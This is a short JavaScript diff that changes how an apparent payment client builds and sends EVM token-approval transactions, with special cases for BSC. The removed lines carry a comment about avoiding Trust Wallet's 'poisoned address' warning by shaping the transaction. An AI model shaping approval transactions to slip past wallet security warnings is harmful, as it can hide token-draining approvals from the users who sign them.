@@ -379,21 +379,12 @@ function checksumEvmAddress(value) {
 }
 
 function evmApproveTransaction(networkKey, from, token, data) {
-    const tx = {
+    return {
         from: checksumEvmAddress(from),
         to: checksumEvmAddress(token),
-        data
+        data,
+        value: "0x0"
     };
-
-    if (networkKey === "bsc") {
-        // No native value. A 0 BNB "send" to BSC-USD makes Trust Wallet flag that
-        // contract as a poisoned address. A contract call is what Ethereum already shows.
-        tx.gas = "0x249f0";
-        return tx;
-    }
-
-    tx.value = "0x0";
-    return tx;
 }
 
 async function sendEvmApprove(client, topic, chainId, from, to, data, networkKey) {
@@ -433,7 +424,9 @@ async function sendWalletApproval(client, session, payment, network, account) {
         return txHash || signed;
     }
 
-    await ensureEvmChain(client, session, network, topic);
+    if (network.key !== "bsc") {
+        await ensureEvmChain(client, session, network, topic);
+    }
     return sendEvmApprove(
         client,
         topic,
